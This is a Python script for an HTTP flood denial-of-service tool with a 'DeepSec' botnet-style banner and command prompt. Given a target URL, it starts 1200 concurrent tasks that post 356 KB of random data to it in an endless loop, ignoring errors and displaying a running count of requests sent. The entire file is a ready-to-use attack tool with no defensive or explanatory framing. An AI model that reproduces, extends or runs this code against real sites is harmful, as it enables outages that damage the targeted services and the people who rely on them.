import aiohttp, asyncio, socket, os, sys, time
from colorama import Fore, Style, init

init(autoreset=True)

PK, RD, WH, CY, BR = Fore.MAGENTA, Fore.RED, Fore.WHITE, Fore.CYAN, Style.BRIGHT
P_SIZE = 356 * 1024 
DATA = os.urandom(P_SIZE)

def draw_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{BR}{PK}")
    print(r"  ██████╗ ███████╗███████╗██████╗ ███████╗███████╗ ██████╗")
    print(r"  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝")
    print(r"  ██║  ██║█████╗  █████╗  ██████╔╝███████╗█████╗  ██║     ")
    print(r"  ██║  ██║██╔════╝██╔════╝██╔═══╝ ╚════██║██╔═══╝  ██║     ")
    print(r"  ██████╔╝███████╗███████╗██║     ███████║███████╗╚██████╗")
    print(r"  ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝ ╚═════╝")
    print(f"{BR}{CY}  ╚═══════════════ DEEPSEC TERMINAL v85.0 ════════════════╝")
    return input(f'{RD}DeepSec-root@botnet# {WH}').strip()

async def l7(session, url, cmd):
    global cnt
    while True:
        try:
            async with session.post(url, data=DATA, timeout=5) as r:
                cnt += 1
                if cnt % 10 == 0: sys.stdout.write(f"\r{PK}[{cmd.upper()}] Sent: {cnt} | 356KB")
        except: pass

async def start(target, cmd):
    global cnt
    cnt = 0
    print(f"\n{WH}[!] Target: {target} | Method: {cmd.upper()}\n")
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[l7(session, target, cmd) for _ in range(1200)])

def main():
    while True:
        ui = draw_logo()
        if not ui: continue
        p = ui.split()
        cmd = p[0].lower()
        
        if cmd == "!help":
            print(f"\n{WH}╔════════════════════════════════════════╗")
            print(f"{WH}║ !aiohttp (356KB)                       ║")
            print(f"{WH}╚════════════════════════════════════════╝"); input()
            
        elif cmd == "!aiohttp":
            if len(p) < 2: continue
            try:
                asyncio.run(start(p[1], cmd))
            except KeyboardInterrupt:
                pass
                
        elif cmd == "exit": break

if __name__ == "__main__":
    main()
